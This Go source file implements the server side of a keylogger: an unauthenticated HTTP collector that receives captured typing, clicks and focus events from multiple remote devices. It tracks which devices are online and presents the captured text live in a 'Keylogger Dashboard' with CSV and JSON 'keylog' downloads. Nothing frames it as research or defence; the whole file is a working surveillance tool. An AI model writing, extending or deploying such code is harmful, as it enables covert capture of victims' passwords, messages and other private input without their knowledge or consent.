package main

import (
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

type Entry struct {
	Device    string `json:"device"`
	Timestamp string `json:"timestamp"`
	Action    string `json:"action"`
	Data      string `json:"data"`
}

type DeviceInfo struct {
	Device   string `json:"device"`
	LastSeen string `json:"last_seen"`
	Online   bool   `json:"online"`
}

const onlineWindow = 60 * time.Second // device is "online" if heard from within 60s

var (
	mu      sync.Mutex
	entries []Entry
	devices = map[string]time.Time{} // device -> last seen
	logFile = "logs.json"
)

const maxEntries = 5000

func loadLogs() {
	if data, err := os.ReadFile(logFile); err == nil {
		json.Unmarshal(data, &entries)
	}
	for _, e := range entries {
		if e.Device != "" {
			devices[e.Device] = time.Now() // assume present at startup
		}
	}
}

func saveLogs() {
	data, _ := json.MarshalIndent(entries, "", "  ")
	os.WriteFile(logFile, data, 0600)
}

func markSeen(device string) {
	if device == "" {
		device = "Unknown"
	}
	devices[device] = time.Now()
}

func addEntry(e Entry) {
	mu.Lock()
	defer mu.Unlock()
	markSeen(e.Device)
	if e.Timestamp == "" {
		e.Timestamp = time.Now().UTC().Format(time.RFC3339)
	}
	entries = append(entries, e)
	if len(entries) > maxEntries {
		entries = entries[len(entries)-maxEntries:]
	}
	saveLogs()
}

func reverse(in []Entry) []Entry {
	out := make([]Entry, len(in))
	for i, e := range in {
		out[len(in)-1-i] = e
	}
	return out
}

func deviceOf(r *http.Request, name string) string {
	if name != "" {
		return name
	}
	return r.URL.Query().Get("device")
}

func main() {
	loadLogs()

	http.HandleFunc("/", handleUI)
	http.HandleFunc("/log", handlePost)
	http.HandleFunc("/ping", handlePing)
	http.HandleFunc("/logs", handleLogs)
	http.HandleFunc("/devices", handleDevices)
	http.HandleFunc("/logs/download", handleDownload)
	http.HandleFunc("/logs/clear", handleClear)

	log.Println("Listening on :8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}

func handlePing(w http.ResponseWriter, r *http.Request) {
	d := r.URL.Query().Get("device")
	mu.Lock()
	markSeen(d)
	online := true
	mu.Unlock()
	log.Printf("PING from %s (%s)", d, r.RemoteAddr)
	w.Header().Set("Content-Type", "application/json")
	fmt.Fprint(w, fmt.Sprintf(`{"status":"ok","online":%v}`, online))
}

// accepts: JSON array, JSON object, legacy pipe. Device from JSON field or ?device=
func handlePost(w http.ResponseWriter, r *http.Request) {
	defer func() {
		if rec := recover(); rec != nil {
			log.Printf("recovered from panic: %v", rec)
			http.Error(w, "bad request", http.StatusBadRequest)
		}
	}()

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
	if err != nil {
		http.Error(w, "read error", http.StatusBadRequest)
		return
	}
	s := strings.TrimSpace(string(body))

	// 1) JSON array (new app batch)
	if strings.HasPrefix(s, "[") {
		var batch []Entry
		if json.Unmarshal([]byte(s), &batch) == nil {
			q := r.URL.Query().Get("device")
			for _, e := range batch {
				e.Device = deviceOf(r, e.Device)
				if e.Device == "" {
					e.Device = q
				}
				addEntry(e)
			}
			fmt.Fprint(w, `{"status":"ok"}`)
			return
		}
	}

	// 2) JSON object
	if strings.HasPrefix(s, "{") {
		var e Entry
		if json.Unmarshal([]byte(s), &e) == nil && e.Action != "" {
			e.Device = deviceOf(r, e.Device)
			addEntry(e)
			fmt.Fprint(w, `{"status":"ok"}`)
			return
		}
	}

	// 3) Legacy pipe format (old app): device comes from ?device= query param
	parts := strings.SplitN(s, "|", 3)
	if len(parts) == 3 {
		addEntry(Entry{
			Device:    deviceOf(r, ""),
			Timestamp: parts[0],
			Action:    parts[1],
			Data:      parts[2],
		})
		fmt.Fprint(w, `{"status":"ok"}`)
		return
	}

	http.Error(w, "bad request", http.StatusBadRequest)
}

func handleLogs(w http.ResponseWriter, r *http.Request) {
	filter := r.URL.Query().Get("device")
	mu.Lock()
	defer mu.Unlock()
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")
	ents := reverse(entries)
	if filter != "" {
		var out []Entry
		for _, e := range ents {
			if e.Device == filter {
				out = append(out, e)
			}
		}
		ents = out
	}
	if ents == nil {
		ents = []Entry{}
	}
	json.NewEncoder(w).Encode(ents)
}

func handleDevices(w http.ResponseWriter, r *http.Request) {
	mu.Lock()
	defer mu.Unlock()
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")
	list := []DeviceInfo{}
	for d, t := range devices {
		list = append(list, DeviceInfo{
			Device:   d,
			LastSeen: t.Format("15:04:05"),
			Online:   time.Since(t) < onlineWindow,
		})
	}
	json.NewEncoder(w).Encode(list)
}

func handleClear(w http.ResponseWriter, r *http.Request) {
	filter := r.URL.Query().Get("device")
	mu.Lock()
	if filter == "" {
		entries = nil
		devices = map[string]time.Time{}
	} else {
		var out []Entry
		for _, e := range entries {
			if e.Device != filter {
				out = append(out, e)
			}
		}
		entries = out
		delete(devices, filter)
	}
	saveLogs()
	mu.Unlock()
	http.Redirect(w, r, "/", http.StatusSeeOther)
}

func handleDownload(w http.ResponseWriter, r *http.Request) {
	filter := r.URL.Query().Get("device")
	mu.Lock()
	ents := reverse(entries)
	mu.Unlock()
	if filter != "" {
		var out []Entry
		for _, e := range ents {
			if e.Device == filter {
				out = append(out, e)
			}
		}
		ents = out
	}

	label := "all"
	if filter != "" {
		label = filter
	}
	stamp := time.Now().Format("2006-01-02_15-04-05")
	switch r.URL.Query().Get("format") {
	case "csv":
		w.Header().Set("Content-Type", "text/csv")
		w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="keylog_%s_%s.csv"`, label, stamp))
		cw := csv.NewWriter(w)
		cw.Write([]string{"Device", "Timestamp", "Action", "Data"})
		for _, e := range ents {
			cw.Write([]string{e.Device, e.Timestamp, e.Action, e.Data})
		}
		cw.Flush()
	default:
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="keylog_%s_%s.json"`, label, stamp))
		json.NewEncoder(w).Encode(ents)
	}
}

func handleUI(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		handlePost(w, r)
		return
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Keylogger Dashboard</title>
<style>
  :root { --bg:#0f172a; --card:#1e293b; --accent:#38bdf8; --text:#e2e8f0; }
  body { background:var(--bg); color:var(--text); font-family:system-ui,sans-serif; margin:0; padding:2rem; }
  h1 { margin-top:0; }
  .tabs { display:flex; gap:.5rem; flex-wrap:wrap; margin-bottom:1rem; }
  .tab {
    background:var(--card); border:1px solid #334155; border-radius:10px;
    padding:.55rem 1rem; cursor:pointer; display:flex; align-items:center; gap:.5rem;
  }
  .tab.active { border-color:var(--accent); background:#164e63; }
  .dot { width:9px; height:9px; border-radius:50%; }
  .online  { background:#4ade80; box-shadow:0 0 6px #4ade80; }
  .offline { background:#64748b; }
  .lastseen { color:#94a3b8; font-size:.72rem; }
  .toolbar { display:flex; gap:.75rem; flex-wrap:wrap; margin-bottom:1rem; align-items:center; }
  input, select, button, a.btn {
    background:var(--card); color:var(--text); border:1px solid #334155;
    border-radius:8px; padding:.5rem .9rem; font-size:.95rem; text-decoration:none;
  }
  button:hover, a.btn:hover { border-color:var(--accent); cursor:pointer; }
  .card { background:var(--card); border-radius:12px; padding:1rem; overflow-x:auto; }
  table { width:100%; border-collapse:collapse; }
  th { text-align:left; color:var(--accent); font-size:.85rem; text-transform:uppercase; }
  th, td { padding:.55rem .75rem; border-bottom:1px solid #334155; }
  tr:hover td { background:#273449; }
  tr.new td { animation: flash 1.5s ease-out; }
  @keyframes flash { from { background:#155e75; } to { background:transparent; } }
  .badge { padding:.15rem .55rem; border-radius:99px; font-size:.75rem; font-weight:600; }
  .TEXT { background:#7c2d12; color:#fdba74; }
  .CLICKED { background:#14532d; color:#86efac; }
  .FOCUSED { background:#1e3a8a; color:#93c5fd; }
  .count { color:#94a3b8; font-size:.9rem; }
  .live { color:#4ade80; font-size:.85rem; }
</style>
</head>
<body>
<h1>Keylogger Dashboard <span class="live">&#9679; live</span></h1>
<div class="tabs" id="tabs"></div>
<div class="toolbar">
  <input id="search" type="text" placeholder="Search..." oninput="render()">
  <select id="actionFilter" onchange="render()">
    <option value="">All actions</option>
    <option>TEXT</option><option>CLICKED</option><option>FOCUSED</option>
  </select>
  <a class="btn" id="dlJson" href="/logs/download?format=json">&#11015; JSON</a>
  <a class="btn" id="dlCsv" href="/logs/download?format=csv">&#11015; CSV</a>
  <button onclick="clearLogs()">Clear</button>
  <span class="count" id="count"></span>
</div>
<div class="card">
<table>
<thead><tr><th>Timestamp</th><th>Action</th><th>Data</th></tr></thead>
<tbody id="tbody"></tbody>
</table></div>
<script>
let devices = [];
let entries = [];
let lastCount = -1;
let selected = '';       // '' = all devices
let newCount = 0;

async function poll(){
  try {
    const [dRes, lRes] = await Promise.all([
      fetch('/devices', {cache:'no-store'}),
      fetch('/logs' + (selected ? '?device=' + encodeURIComponent(selected) : ''), {cache:'no-store'})
    ]);
    devices = await dRes.json();
    entries = await lRes.json();
    renderTabs(); render();
  } catch(e) {}
}

function esc(s){
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&#34;');
}

function renderTabs(){
  const tabs = document.getElementById('tabs');
  tabs.innerHTML = '';
  const all = document.createElement('div');
  all.className = 'tab' + (selected === '' ? ' active' : '');
  all.innerHTML = '<b>All devices</b>';
  all.onclick = () => { selectDevice(''); };
  tabs.appendChild(all);

  devices.forEach(d => {
    const t = document.createElement('div');
    t.className = 'tab' + (selected === d.device ? ' active' : '');
    t.innerHTML = '<span class="dot ' + (d.online ? 'online' : 'offline') + '"></span>'
      + '<span><b>' + esc(d.device) + '</b><br><span class="lastseen">'
      + (d.online ? 'online' : 'last seen ' + esc(d.last_seen)) + '</span></span>';
    t.onclick = () => { selectDevice(d.device); };
    tabs.appendChild(t);
  });
}

function selectDevice(d){
  selected = d;
  lastCount = -1;
  updateDownloadLinks();
  poll();
}

function updateDownloadLinks(){
  const q = selected ? '?device=' + encodeURIComponent(selected) + '&' : '?';
  document.getElementById('dlJson').href = '/logs/download' + q + 'format=json';
  document.getElementById('dlCsv').href  = '/logs/download' + q + 'format=csv';
}

function render(){
  const q = document.getElementById('search').value.toLowerCase();
  const a = document.getElementById('actionFilter').value;
  const tbody = document.getElementById('tbody');
  tbody.innerHTML = '';
  let shown = 0;
  entries.forEach((e, i) => {
    const row = (e.timestamp + ' ' + e.data).toLowerCase();
    if (q && !row.includes(q)) return;
    if (a && e.action !== a) return;
    shown++;
    const tr = document.createElement('tr');
    if (lastCount >= 0 && i >= lastCount) tr.className = 'new';
    tr.innerHTML = '<td>' + esc(e.timestamp) + '</td>'
      + '<td><span class="badge ' + esc(e.action) + '">' + esc(e.action) + '</span></td>'
      + '<td>' + esc(e.data) + '</td>';
    tbody.appendChild(tr);
  });
  document.getElementById('count').textContent = shown + ' entries';
  lastCount = entries.length;
}

function clearLogs(){
  if (!confirm('Clear logs for ' + (selected || 'ALL devices') + '?')) return;
  fetch('/logs/clear' + (selected ? '?device=' + encodeURIComponent(selected) : ''))
    .then(() => { lastCount = -1; poll(); });
}

updateDownloadLinks();
poll();
setInterval(poll, 2000);
</script>
</body></html>`)
}
